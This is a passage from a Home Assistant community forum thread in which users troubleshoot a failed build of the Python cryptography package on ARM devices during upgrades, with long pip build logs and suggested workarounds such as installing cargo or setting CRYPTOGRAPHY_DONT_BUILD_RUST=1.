wheel would avoid the need for a Rust compiler. To update pip, run: …</p>\n</blockquote>\n<p><a href=\"https://community.home-assistant.io/u/Piotr_Kowalski\">Piotr_Kowalski</a> (Piotr Kowalski)November 6, 2021, 10:20am#3</p>\n<p><a href=\"https://community.home-assistant.io/t/cannot-update-to-2021-10-0/344695/1\">Cannot update to 2021.10.0</a></p>\n<blockquote>\n<p>ython env and i updated each time a new update came out however today i cannot update 2021.10.0. i get this after running python3 -m pip install –upgrade homeassistant in the cor</p>\n</blockquote>\n<p>I have the same problem. The newest pip. I did everything from the instruction and still have:</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">`Building wheels for collected packages: cryptography</span><br><span class=\"line\">  Building wheel for cryptography (pyproject.toml) ... error</span><br><span class=\"line\">  ERROR: Command errored out with exit status 1:</span><br><span class=\"line\">   command: /srv/homeassistant/bin/python3.9 /srv/homeassistant/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /tmp/tmpd9ajr6wm</span><br><span class=\"line\">       cwd: /tmp/pip-install-04ynrnsi/cryptography_8e9ff41f16f041f0a756a1d3c41d0f24</span><br><span class=\"line\">  Complete output (205 lines):</span><br><span class=\"line\">  running bdist_wheel</span><br><span class=\"line\">  running build</span><br><span class=\"line\">  running build_py</span><br><span class=\"line\">  creating build</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography</span><br><span class=\"line\">  copying src/cryptography/__about__.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class=\"line\">  copying src/cryptography/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class=\"line\">  copying src/cryptography/fernet.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class=\"line\">  copying src/cryptography/utils.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class=\"line\">  copying src/cryptography/exceptions.py -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/ocsp.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/certificate_transparency.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/oid.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/general_name.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/extensions.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/name.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/base.py -&gt; build/lib.linux-armv7l-3.9/cryptography/x509</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class=\"line\">  copying src/cryptography/hazmat/_der.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class=\"line\">  copying src/cryptography/hazmat/_oid.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class=\"line\">  copying src/cryptography/hazmat/_types.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class=\"line\">  copying src/cryptography/hazmat/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/hashes.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/_cipheralgorithm.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/padding.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/_serialization.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/hmac.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/keywrap.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/cmac.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/_asymmetric.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/constant_time.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/poly1305.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/backends</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/interfaces.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/kbkdf.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/hkdf.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/concatkdf.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/x963kdf.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/pbkdf2.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/kdf/scrypt.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/kdf</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/twofactor/totp.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/twofactor/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/twofactor/hotp.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/twofactor/utils.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/twofactor</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/aead.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/modes.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/algorithms.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/ciphers/base.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/ciphers</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/ed25519.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/dh.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/x25519.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/padding.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/rsa.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/ed448.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/dsa.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/utils.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/ec.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/asymmetric/x448.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/asymmetric</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/pkcs7.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/base.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/ssh.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/serialization/pkcs12.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/primitives/serialization</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/openssl/binding.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/openssl/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/bindings/openssl/_conditional.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/bindings/openssl</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ocsp.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ed25519.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/hashes.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/dh.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/decode_asn1.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/x509.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/aead.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/x25519.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/backend.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/rsa.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ed448.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/encode_asn1.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/__init__.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/hmac.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/dsa.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/utils.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/cmac.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ec.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/poly1305.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/ciphers.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/openssl/x448.py -&gt; build/lib.linux-armv7l-3.9/cryptography/hazmat/backends/openssl</span><br><span class=\"line\">  running egg_info</span><br><span class=\"line\">  writing src/cryptography.egg-info/PKG-INFO</span><br><span class=\"line\">  writing dependency_links to src/cryptography.egg-info/dependency_links.txt</span><br><span class=\"line\">  writing requirements to src/cryptography.egg-info/requires.txt</span><br><span class=\"line\">  writing top-level names to src/cryptography.egg-info/top_level.txt</span><br><span class=\"line\">  reading manifest file &#x27;src/cryptography.egg-info/SOURCES.txt&#x27;</span><br><span class=\"line\">  reading manifest template &#x27;MANIFEST.in&#x27;</span><br><span class=\"line\">  no previously-included directories found matching &#x27;docs/_build&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;vectors&#x27;</span><br><span class=\"line\">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;vectors&#x27;</span><br><span class=\"line\">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.github&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;release.py&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;.coveragerc&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;codecov.yml&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;.readthedocs.yml&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;dev-requirements.txt&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;tox.ini&#x27;</span><br><span class=\"line\">  warning: no previously-included files found matching &#x27;mypy.ini&#x27;</span><br><span class=\"line\">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.zuul.d&#x27;</span><br><span class=\"line\">  warning: no previously-included files matching &#x27;*&#x27; found under directory &#x27;.zuul.playbooks&#x27;</span><br><span class=\"line\">  adding license file &#x27;LICENSE&#x27;</span><br><span class=\"line\">  adding license file &#x27;LICENSE.APACHE&#x27;</span><br><span class=\"line\">  adding license file &#x27;LICENSE.BSD&#x27;</span><br><span class=\"line\">  adding license file &#x27;LICENSE.PSF&#x27;</span><br><span class=\"line\">  writing manifest file &#x27;src/cryptography.egg-info/SOURCES.txt&#x27;</span><br><span class=\"line\">  copying src/cryptography/py.typed -&gt; build/lib.linux-armv7l-3.9/cryptography</span><br><span class=\"line\">  running build_ext</span><br><span class=\"line\">  generating cffi module &#x27;build/temp.linux-armv7l-3.9/_padding.c&#x27;</span><br><span class=\"line\">  creating build/temp.linux-armv7l-3.9</span><br><span class=\"line\">  generating cffi module &#x27;build/temp.linux-armv7l-3.9/_openssl.c&#x27;</span><br><span class=\"line\">  running build_rust</span><br><span class=\"line\">      Updating crates.io index</span><br><span class=\"line\"></span><br><span class=\"line\">      =============================DEBUG ASSISTANCE=============================</span><br><span class=\"line\">      If you are seeing a compilation error please try the following steps to</span><br><span class=\"line\">      successfully install cryptography:</span><br><span class=\"line\">      1) Upgrade to the latest pip and try again. This will fix errors for most</span><br><span class=\"line\">         users. See: https://pip.pypa.io/en/stable/installing/#upgrading-pip</span><br><span class=\"line\">      2) Read https://cryptography.io/en/latest/installation.html for specific</span><br><span class=\"line\">         instructions for your platform.</span><br><span class=\"line\">      3) Check our frequently asked questions for more information:</span><br><span class=\"line\">         https://cryptography.io/en/latest/faq.html</span><br><span class=\"line\">      4) Ensure you have a recent Rust toolchain installed:</span><br><span class=\"line\">         https://cryptography.io/en/latest/installation.html#rust</span><br><span class=\"line\">      5) If you are experiencing issues with Rust for *this release only* you may</span><br><span class=\"line\">         set the environment variable `CRYPTOGRAPHY_DONT_BUILD_RUST=1`.</span><br><span class=\"line\">      =============================DEBUG ASSISTANCE=============================</span><br><span class=\"line\"></span><br><span class=\"line\">  Traceback (most recent call last):</span><br><span class=\"line\">    File &quot;/srv/homeassistant/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 363, in &lt;module&gt;</span><br><span class=\"line\">      main()</span><br><span class=\"line\">    File &quot;/srv/homeassistant/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 345, in main</span><br><span class=\"line\">      json_out[&#x27;return_val&#x27;] = hook(**hook_input[&#x27;kwargs&#x27;])</span><br><span class=\"line\">    File &quot;/srv/homeassistant/lib/python3.9/site-packages/pip/_vendor/pep517/in_process/_in_process.py&quot;, line 261, in build_wheel</span><br><span class=\"line\">      return _build_backend().build_wheel(wheel_directory, config_settings,</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools/build_meta.py&quot;, line 230, in build_wheel</span><br><span class=\"line\">      return self._build_with_temp_dir([&#x27;bdist_wheel&#x27;], &#x27;.whl&#x27;,</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools/build_meta.py&quot;, line 215, in _build_with_temp_dir</span><br><span class=\"line\">      self.run_setup()</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools/build_meta.py&quot;, line 158, in run_setup</span><br><span class=\"line\">      exec(compile(code, __file__, &#x27;exec&#x27;), locals())</span><br><span class=\"line\">    File &quot;setup.py&quot;, line 71, in &lt;module&gt;</span><br><span class=\"line\">      setup(</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools/__init__.py&quot;, line 159, in setup</span><br><span class=\"line\">      return distutils.core.setup(**attrs)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/distutils/core.py&quot;, line 148, in setup</span><br><span class=\"line\">      dist.run_commands()</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/distutils/dist.py&quot;, line 966, in run_commands</span><br><span class=\"line\">      self.run_command(cmd)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/distutils/dist.py&quot;, line 985, in run_command</span><br><span class=\"line\">      cmd_obj.run()</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/wheel/bdist_wheel.py&quot;, line 299, in run</span><br><span class=\"line\">      self.run_command(&#x27;build&#x27;)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/distutils/cmd.py&quot;, line 313, in run_command</span><br><span class=\"line\">      self.distribution.run_command(command)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/distutils/dist.py&quot;, line 985, in run_command</span><br><span class=\"line\">      cmd_obj.run()</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/distutils/command/build.py&quot;, line 135, in run</span><br><span class=\"line\">      self.run_command(cmd_name)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/distutils/cmd.py&quot;, line 313, in run_command</span><br><span class=\"line\">      self.distribution.run_command(command)</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/distutils/dist.py&quot;, line 985, in run_command</span><br><span class=\"line\">      cmd_obj.run()</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/cffi/setuptools_ext.py&quot;, line 144, in run</span><br><span class=\"line\">      base_class.run(self)</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/cffi/setuptools_ext.py&quot;, line 144, in run</span><br><span class=\"line\">      base_class.run(self)</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools_rust/setuptools_ext.py&quot;, line 103, in run</span><br><span class=\"line\">      build_rust.run()</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools_rust/command.py&quot;, line 52, in run</span><br><span class=\"line\">      self.run_for_extension(ext)</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools_rust/build.py&quot;, line 92, in run_for_extension</span><br><span class=\"line\">      dylib_paths = self.build_extension(ext)</span><br><span class=\"line\">    File &quot;/tmp/pip-build-env-5t3c7yw3/overlay/lib/python3.9/site-packages/setuptools_rust/build.py&quot;, line 131, in build_extension</span><br><span class=\"line\">      metadata = json.loads(check_output(metadata_command))</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/subprocess.py&quot;, line 420, in check_output</span><br><span class=\"line\">      return run(*popenargs, stdout=PIPE, timeout=timeout, check=True,</span><br><span class=\"line\">    File &quot;/usr/local/lib/python3.9/subprocess.py&quot;, line 524, in run</span><br><span class=\"line\">      raise CalledProcessError(retcode, process.args,</span><br><span class=\"line\">  subprocess.CalledProcessError: Command &#x27;[&#x27;cargo&#x27;, &#x27;metadata&#x27;, &#x27;--manifest-path&#x27;, &#x27;src/rust/Cargo.toml&#x27;, &#x27;--format-version&#x27;, &#x27;1&#x27;]&#x27; died with &lt;Signals.SIGSEGV: 11&gt;.</span><br><span class=\"line\">  ----------------------------------------</span><br><span class=\"line\">  ERROR: Failed building wheel for cryptography`</span><br></pre></td></tr></table></figure>\n\n<p><a href=\"https://community.home-assistant.io/u/ceh\">ceh</a>November 6, 2021, 1:04pm#4</p>\n<p>I believe you need to install cargo.</p>\n<p>sudo apt install cargo</p>\n<p><a href=\"https://community.home-assistant.io/u/trentjw\">trentjw</a> (Trenton J Wilson)November 6, 2021, 10:34pm#5</p>\n<p>this is what I did just before the pip3 install command</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">export CRYPTOGRAPHY_DONT_BUILD_RUST=1</span><br><span class=\"line\"></span><br><span class=\"line\">pip3 install --upgrade homeassistant</span><br></pre></td></tr></table></figure>\n\n<p>1 Like</p>\n<p><a href=\"https://community.home-assistant.io/u/Piotr_Kowalski\">Piotr_Kowalski</a> (Piotr Kowalski)November 7, 2021, 9:38am#6</p>\n<p>It works, thank you so much!</p>\n<p><a href=\"https://community.home-assistant.io/u/robg\">robg</a> (Robert Gallesio)December 6, 2021, 8:23am#7</p>\n<p>Cargo didn’t fix the problem but<br>export CRYPTOGRAPHY_DONT_BUILD_RUST=1</p>\n<p>did the trick!!!</p>\n<p>1 Like</p>\n<p><a href=\"https://community.home-assistant.io/u/maxxer\">maxxer</a> (Maxxer)December 14, 2021, 11:39pm#8</p>\n<p>I’m trying to build Python 3.8.12 but I’m stuck with the cryptography build error, no way to get rid of it. I tried <code>export</code>, setting the value in <code>.env</code>, passing the var to the pip install command… No way! I don’t know where to look at, any hint is welcome. Thanks</p>\n<p><a href=\"https://community.home-assistant.io/u/Rudhan\">Rudhan</a> (Tomas Rudh)December 17, 2021, 9:04pm#9</p>\n<p>I also get this error, when trying to upgrade to 2021.12.3. I have tried with</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">export CRYPTOGRAPHY_DONT_BUILD_RUST=1</span><br></pre></td></tr></table></figure>\n\n<p>but no luck. Also installing cargo does not help. Any ideas?</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">  ERROR: Command errored out with exit status 1:</span><br><span class=\"line\">   command: /srv/homeassistant/bin/python3.8 /srv/homeassistant/lib/python3.8/site-packages/pip/_vendor/pep517/in_process/_in_process.py build_wheel /tmp/tmpzoxrpswf</span><br><span class=\"line\">       cwd: /tmp/pip-install-d22wa9ai/cryptography_fd6fd4109a8a463c855d00034731061a</span><br><span class=\"line\">  Complete output (208 lines):</span><br><span class=\"line\">  running bdist_wheel</span><br><span class=\"line\">  running build</span><br><span class=\"line\">  running build_py</span><br><span class=\"line\">  creating build</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography</span><br><span class=\"line\">  copying src/cryptography/exceptions.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class=\"line\">  copying src/cryptography/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class=\"line\">  copying src/cryptography/fernet.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class=\"line\">  copying src/cryptography/__about__.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class=\"line\">  copying src/cryptography/utils.py -&gt; build/lib.linux-armv7l-3.8/cryptography</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/certificate_transparency.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/base.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/general_name.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/oid.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/name.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/ocsp.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  copying src/cryptography/x509/extensions.py -&gt; build/lib.linux-armv7l-3.8/cryptography/x509</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat</span><br><span class=\"line\">  copying src/cryptography/hazmat/_oid.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat</span><br><span class=\"line\">  copying src/cryptography/hazmat/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/backends</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/__init__.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends</span><br><span class=\"line\">  copying src/cryptography/hazmat/backends/interfaces.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/backends</span><br><span class=\"line\">  creating build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span class=\"line\">  copying src/cryptography/hazmat/primitives/_cipheralgorithm.py -&gt; build/lib.linux-armv7l-3.8/cryptography/hazmat/primitives</span><br><span 